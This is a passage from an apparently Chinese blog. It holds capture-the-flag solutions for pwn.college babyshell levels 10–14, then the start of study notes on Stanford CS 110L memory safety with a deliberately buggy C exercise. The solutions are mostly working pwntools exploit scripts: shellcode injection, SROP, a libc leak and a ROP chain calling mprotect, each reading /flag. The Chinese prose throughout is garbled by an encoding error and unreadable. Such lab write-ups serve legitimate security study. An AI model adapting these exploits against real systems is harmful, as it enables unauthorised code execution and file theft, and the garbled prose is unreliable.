class="hljs-string">&#x27;/flag&#x27;</span>)))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L10-L11"><a class="header-anchor" href="#L10-L11">Â¶</a>L10,L11</h2><p>JOP æ€æƒ³ï¼Œé«˜ä½å­—èŠ‚æ²¡ç”¨å¯ä»¥æ‹¿æ¥è®¾ç½®é¡ºåºï¼Œdebug è°ƒè°ƒå°±è¡Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br>elf = ELF(<span class="hljs-string">&#x27;/challenge/babyshell_level10&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level10&#x27;</span>)<br><br><span class="hljs-comment"># se(asm(&#x27;xor edi,edi;mov esi,edx;syscall;&#x27;).ljust(8,b&#x27;\x00&#x27;).ljust(256,b&#x27;\x90&#x27;))</span><br>se(((asm(<span class="hljs-string">&#x27;add dx,8;&#x27;</span>)+<span class="hljs-string">b&#x27;\xeb\x0a\x00&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+<span class="hljs-string">b&#x27;//flag\0\0&#x27;</span>+(asm(<span class="hljs-string">&#x27;mov edi,edx;&#x27;</span>)+<span class="hljs-string">b&#x27;\xeb\x04\x00\x02\x12&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+(asm(<span class="hljs-string">&#x27;mov esi,7;&#x27;</span>)+<span class="hljs-string">b&#x27;\xeb\x01\x00&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+(asm(<span class="hljs-string">&#x27;add eax,90;syscall;&#x27;</span>)+<span class="hljs-string">b&#x27;\x03\x15\x15&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)).ljust(<span class="hljs-number">256</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L12-v3"><a class="header-anchor" href="#L12-v3">Â¶</a>L12</h2><p>ban äº†å’Œæ²¡ ban ä¸€æ ·=ã€‚=</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/babyshell_level12&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level12&#x27;</span>)<br>se(asm(<span class="hljs-string">&#x27;xor edi,edi;mov rsi,rdx;syscall;&#x27;</span>))<br>pause()<br>se(asm(<span class="hljs-string">&#x27;nop;&#x27;</span>*<span class="hljs-number">0x30</span>+shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L13-v3"><a class="header-anchor" href="#L13-v3">Â¶</a>L13</h2><p>å¾ˆæœ‰æ„æ€ï¼ŒSROP + æ‰“æ ˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/babyshell_level13&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level13&#x27;</span>)<br>rdi =  <span class="hljs-number">0x2307000a</span><br>syscall_ret = <span class="hljs-number">0x23070007</span> <br>se(asm(<span class="hljs-string">&#x27;xor eax,eax;mov rsi,rsp;xor edi,edi;&#x27;</span>+<span class="hljs-string">&#x27;syscall;ret;pop rdi;ret;&#x27;</span>))<br>pause()<br>se(flat([<span class="hljs-number">0x23070000</span>,rdi,<span class="hljs-number">1</span>,syscall_ret,<span class="hljs-number">0x23070000</span>]))<br>pause()<br>se(<span class="hljs-string">&#x27;\x0a&#x27;</span>)<br>stack_addr = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x24083</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>pop_rdi_ret = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;pop rdi\nret&quot;</span>)))<br>pop_rsi_ret = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;pop rsi\nret&quot;</span>)))<br>pop_rax_ret = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;pop rax\nret&quot;</span>)))<br>syscall_ret = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;syscall\nret&quot;</span>)))<br><span class="hljs-comment"># pop_rdx_ret = next(libc.search(asm(&quot;pop rdx\nret&quot;)))</span><br><span class="hljs-comment"># lg(&#x27;pop_rdx_ret&#x27;,pop_rdx_ret)</span><br>pop_rdx_r12_ret = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;pop rdx\npop r12\nret&quot;</span>)))<br>lg(<span class="hljs-string">&#x27;pop_rdx_r12_ret&#x27;</span>,pop_rdx_r12_ret)<br><br>pause()<br>rop_chain = flat([pop_rdi_ret,stack_addr&amp;(~<span class="hljs-number">0xfff</span>),pop_rsi_ret,<span class="hljs-number">0x2000</span>,pop_rdx_r12_ret,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,libc.sym.mprotect,<br>                    stack_addr-<span class="hljs-number">0xd8</span>,asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))])<br>se(rop_chain)<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L14-v3"><a class="header-anchor" href="#L14-v3">Â¶</a>L14</h2><p>æ„Ÿè§‰ä¸å¦‚ L13ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    gdb.attach(p)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/babyshell_level14&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level14&#x27;</span>)<br><br>se(asm(<span class="hljs-string">&#x27;xor edi,edi;mov esi,edx;syscall;&#x27;</span>))<br>se(asm(<span class="hljs-string">&#x27;nop;&#x27;</span>*<span class="hljs-number">0x30</span>+shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Stanford CS 110L (Safety in Systems Programming)</title>
    <link href="/posts/397be8a1.html"/>
    <url>/posts/397be8a1.html</url>
    
    <content type="html"><![CDATA[<p>Stanford çš„å…¬å¼€è¯¾ï¼Œå¯ä»¥åœ¨<a href="https://reberhardt.com/cs110l/spring-2020/">è¿™é‡Œ</a>æ‰¾åˆ°ï¼Œè¿™é‡Œå•çº¯å­˜ç‚¹ç¬”è®°ã€‚</p><p>ç¬”è€…èƒ½åŠ›éå¸¸æœ‰é™ğŸ‘¦ğŸ»ï¼Œæ‰€ä»¥å‘ç°é—®é¢˜è¿˜è¯·å¤šå¤šæŒ‡æ•™ ovo</p><h1>Lecture 2: Memory Safety</h1><h2 id="Pre-class-exercise"><a class="header-anchor" href="#Pre-class-exercise">Â¶</a>Pre-class exercise</h2><p>ä»¥ä¸‹ç¨‹åºè‡³å°‘æœ‰ä¸ƒå¤„ bugï¼Œå°½å¯èƒ½çš„æ‰¾åˆ°å®ƒä»¬ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-comment">// There are at least 7 bugs relating to memory on this snippet.</span><br><span class="hljs-comment">// Find them all!</span><br><br><span class="hljs-comment">// Vec is short for &quot;vector&quot;, a common term for a resizable array.</span><br><span class="hljs-comment">// For simplicity, our vector type can only hold ints.</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">int</span>* data;     <span class="hljs-comment">// Pointer to our array on the heap</span><br>  <span class="hljs-type">int</span>  length;   <span class="hljs-comment">// How many elements are in our array</span><br>  <span class="hljs-type">int</span>  capacity; <span class="hljs-comment">// How many elements our array can hold</span><br>&#125; Vec;<br><br>Vec* <span class="hljs-title function_">vec_new</span><span class="hljs-params">()</span> &#123;<br>  Vec vec;<br>  vec.data = <span class="hljs-literal">NULL</span>;<br>  vec.length = <span class="hljs-number">0</span>;<br>  vec.capacity = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> &amp;vec;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vec_push</span><span class="hljs-params">(Vec* vec, <span class="hljs-type">int</span> n)</span> &#123;<br>  <span class="hljs-keyword">if</span> (vec-&gt;length == vec-&gt;capacity) &#123;<br>    <span class="hljs-type">int</span> new_capacity = vec-&gt;capacity * <span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span>* new_data = (<span class="hljs-type">int</span>*) <span class="hljs-built_in">malloc</span>(new_capacity);<br>    assert(new_data != <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; vec-&gt;length; ++i) &#123;<br>      new_data[i] = vec-&gt;data[i];<br>    &#125;<br><br>    vec-&gt;data = new_data;<br>    vec-&gt;capacity = new_capacity;<br>  &#125;<br><br>  vec-&gt;data[vec-&gt;length] = n;<br>  ++vec-&gt;length;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vec_free</span><span class="hljs-params">(Vec* vec)</span> &#123;<br>  <span class="hljs-built_in">free</span>(vec);<br>  <span class="hljs-built_in">free</span>(vec-&gt;data);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  Vec* vec = vec_new();<br>  vec_push(vec, <span class="hljs-number">107</span>);<br><br>  <span class="hljs-type">int</span>* n = &amp;vec-&gt;data[<span class="hljs-number">0</span>];<br>  vec_push(vec, <span class="hljs-number">110</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, *n);<br><br>  <span class="hljs-built_in">free</span>(vec-&gt;data);<br>  vec_free(vec);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Answer"><a class="header-anchor" href="#Answer">Â¶</a>Answer</h3><ul><li><p><strong>1.</strong><code>vec_new()</code> è¿”å›çš„ &amp;vec æ˜¯å±€éƒ¨å˜é‡åœ°å€ï¼Œæ˜¯ <code>Dangling Pointer</code>ï¼Œä½†å®é™…è°ƒè¯•å‘ç°æ˜¯ 0 ï¼ˆï¼Ÿï¼‰ã€‚ä¸æ‡‚ï¼ŒæŠŠ vec æ”¹æˆå…¨å±€å˜é‡åç»§ç»­è°ƒè¯•.jpg</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">Vec* <span class="hljs-title function_">vec_new</span><span class="hljs-params">()</span> &#123;<br>  Vec vec;<br>  vec.data = <span class="hljs-literal">NULL</span>;<br>  vec.length = <span class="hljs-number">0</span>;<br>  vec.capacity = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> &amp;vec;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>2.</strong><code>vec_push()</code> ä¸­çš„ <code>vec-&gt;capacity</code> ä¸€ç›´æ˜¯ 0ï¼Œå¯¼è‡´ <code>Heap Overflow</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">vec_push</span><span class="hljs-params">(Vec* vec, <span class="hljs-type">int</span> n)</span> &#123;<br>  <span class="hljs-keyword">if</span> (vec-&gt;length == vec-&gt;capacity) &#123;<br>    <span class="hljs-type">int</span> new_capacity = vec-&gt;capacity * <span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span>* new_data = (<span class="hljs-type">int</span>*) <span class="hljs-built_in">malloc</span>(new_capacity);<br>    assert(new_data != <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; vec-&gt;length; ++i) &#123;<br>      new_data[i] = vec-&gt;data[i];<br>    &#125;<br><br>    vec-&gt;data = new_data;<br>    vec-&gt;capacity = new_capacity;<br>  &#125;<br><br>  vec-&gt;data[vec-&gt;length] = n;<br>  ++vec-&gt;length;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>3.</strong><code>main()</code> ä¸­ <code>free(data)</code> åè°ƒç”¨ <code>vec_free(vec)</code> ï¼Œå¯¼è‡´ <code>Double Free</code>ã€‚</p><p><strong>4.</strong><code>int* n = &amp;vec-&gt;data[0];</code> æŒ‡é’ˆ n æŒ‡å‘ resize å‰çš„ <code>vec-&gt;data</code> åŒºåŸŸ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 